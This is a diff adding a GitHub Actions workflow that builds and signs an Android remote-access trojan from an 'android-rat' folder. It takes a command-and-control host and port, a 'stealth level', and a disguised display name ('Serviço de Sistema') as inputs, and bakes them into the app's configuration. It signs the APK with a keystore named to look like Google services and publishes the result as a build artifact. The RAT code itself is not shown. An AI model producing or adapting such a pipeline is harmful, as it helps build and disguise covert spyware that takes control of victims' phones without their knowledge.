@@ -1,0 +1,174 @@
+name: Build APK
+
+on:
+  workflow_dispatch:
+    inputs:
+      c2_host:
+        description: "C2 server hostname or IP"
+        required: true
+        default: "your-vps.example.com"
+      c2_port:
+        description: "C2 device WebSocket port"
+        required: true
+        default: "3002"
+      app_name:
+        description: "App display name"
+        required: true
+        default: "Serviço de Sistema"
+      stealth_level:
+        description: "Stealth level (1/2/3)"
+        required: true
+        default: "2"
+      signing_mode:
+        description: "Signing mode (release / debug)"
+        required: true
+        default: "release"
+  push:
+    branches: [main]
+    paths:
+      - "android-rat/**"
+
+env:
+  JAVA_VERSION: "17"
+  ANDROID_COMPILE_SDK: "34"
+  ANDROID_BUILD_TOOLS: "34.0.0"
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    timeout-minutes: 30
+
+    steps:
+      # ── Checkout ──────────────────────────────────────────
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      # ── Java ──────────────────────────────────────────────
+      - name: Set up JDK 17
+        uses: actions/setup-java@v4
+        with:
+          java-version: ${{ env.JAVA_VERSION }}
+          distribution: temurin
+          cache: gradle
+
+      # ── Android SDK ───────────────────────────────────────
+      - name: Set up Android SDK
+        uses: android-actions/setup-android@v3
+
+      - name: Install build tools
+        run: |
+          sdkmanager --install \
+            "build-tools;${{ env.ANDROID_BUILD_TOOLS }}" \
+            "platforms;android-${{ env.ANDROID_COMPILE_SDK }}" \
+            --sdk_root=$ANDROID_SDK_ROOT
+
+      # ── Patch local.properties ────────────────────────────
+      - name: Patch build config
+        env:
+          C2_HOST:  ${{ github.event.inputs.c2_host  || 'localhost' }}
+          C2_PORT:  ${{ github.event.inputs.c2_port  || '3002' }}
+          APP_NAME: ${{ github.event.inputs.app_name || 'Serviço de Sistema' }}
+          STEALTH:  ${{ github.event.inputs.stealth_level || '2' }}
+        run: |
+          cd android-rat
+          # Write / overwrite local.properties
+          cat > local.properties <<EOF
+          sdk.dir=$ANDROID_SDK_ROOT
+          c2.host=${C2_HOST}
+          c2.port=${C2_PORT}
+          app.name=${APP_NAME}
+          stealth.level=${STEALTH}
+          EOF
+          echo "local.properties written"
+
+      # ── Restore keystore ──────────────────────────────────
+      - name: Restore keystore
+        if: ${{ github.event.inputs.signing_mode == 'release' || github.event_name == 'push' }}
+        env:
+          KEYSTORE_BASE64: ${{ secrets.KEYSTORE_BASE64 }}
+        run: |
+          if [ -n "$KEYSTORE_BASE64" ]; then
+            echo "$KEYSTORE_BASE64" | base64 -d > android-rat/google-services-release.jks
+            echo "Keystore restored from secret"
+          else
+            echo "No KEYSTORE_BASE64 secret — using bundled keystore"
+          fi
+
+      # ── Gradle build ──────────────────────────────────────
+      - name: Build APK
+        working-directory: android-rat
+        run: |
+          chmod +x gradlew
+          ./gradlew assembleRelease --no-daemon --stacktrace
+
+      # ── uber-apk-signer: use pre-built JAR if available, else build from source ──
+      - name: Download uber-apk-signer (if not in repo)
+        run: |
+          if [ ! -d "uber-apk-signer-main" ]; then
+            echo "uber-apk-signer-main not found, downloading pre-built JAR..."
+            SIGNER_URL=$(curl -s https://api.github.com/repos/patrickfav/uber-apk-signer/releases/latest \
+              | grep 'browser_download_url.*\.jar"' | grep -v sources | head -1 \
+              | cut -d'"' -f4)
+            mkdir -p uber-apk-signer-main/target
+            curl -L "$SIGNER_URL" -o uber-apk-signer-main/target/uber-apk-signer.jar
+            echo "Downloaded: $SIGNER_URL"
+            touch .signer_downloaded
+          fi
+
+      # ── Build uber-apk-signer ─────────────────────────────
+      - name: Cache Maven packages
+        uses: actions/cache@v4
+        with:
+          path: ~/.m2
+          key: ${{ runner.os }}-m2-${{ hashFiles('uber-apk-signer-main/pom.xml') }}
+
+      - name: Build uber-apk-signer from source
+        if: ${{ !hashFiles('.signer_downloaded') }}
+        working-directory: uber-apk-signer-main
+        run: |
+          chmod +x mvnw
+          ./mvnw package -DskipTests -q
+
+      # ── Sign APK ──────────────────────────────────────────
+      - name: Sign with uber-apk-signer
+        if: ${{ github.event.inputs.signing_mode == 'release' || github.event_name == 'push' }}
+        env:
+          KS_ALIAS: ${{ secrets.KEYSTORE_ALIAS    || 'key0' }}
+          KS_PASS:  ${{ secrets.KEYSTORE_PASSWORD || 'android' }}
+        run: |
+          SIGNER_JAR=$(ls uber-apk-signer-main/target/uber-apk-signer*.jar | head -1)
+          APK=$(ls android-rat/app/build/outputs/apk/release/*.apk | head -1)
+          java -jar "$SIGNER_JAR" \
+            --apks "$APK" \
+            --ks android-rat/google-services-release.jks \
+            --ksAlias "$KS_ALIAS" \
+            --ksKeyPass "$KS_PASS" \
+            --ksPass "$KS_PASS" \
+            --out ./signed-output \
+            --overwrite \
+            --allowResign
+          echo "Signed APK:"
+          ls -lh ./signed-output/
+
+      # ── Upload artifact ───────────────────────────────────
+      - name: Upload signed APK
+        uses: actions/upload-artifact@v4
+        with:
+          name: signed-apk-${{ github.run_number }}
+          path: |
+            signed-output/*.apk
+            android-rat/app/build/outputs/apk/release/*.apk
+          retention-days: 7
+          if-no-files-found: warn
+
+      # ── Summary ───────────────────────────────────────────
+      - name: Build summary
+        run: |
+          echo "## APK Build Complete" >> $GITHUB_STEP_SUMMARY
+          echo "" >> $GITHUB_STEP_SUMMARY
+          echo "| Parameter | Value |" >> $GITHUB_STEP_SUMMARY
+          echo "|---|---|" >> $GITHUB_STEP_SUMMARY
+          echo "| C2 Host | ${{ github.event.inputs.c2_host }} |" >> $GITHUB_STEP_SUMMARY
+          echo "| C2 Port | ${{ github.event.inputs.c2_port }} |" >> $GITHUB_STEP_SUMMARY
+          echo "| Stealth Level | ${{ github.event.inputs.stealth_level }} |" >> $GITHUB_STEP_SUMMARY
+          echo "| Run Number | ${{ github.run_number }} |" >> $GITHUB_STEP_SUMMARY
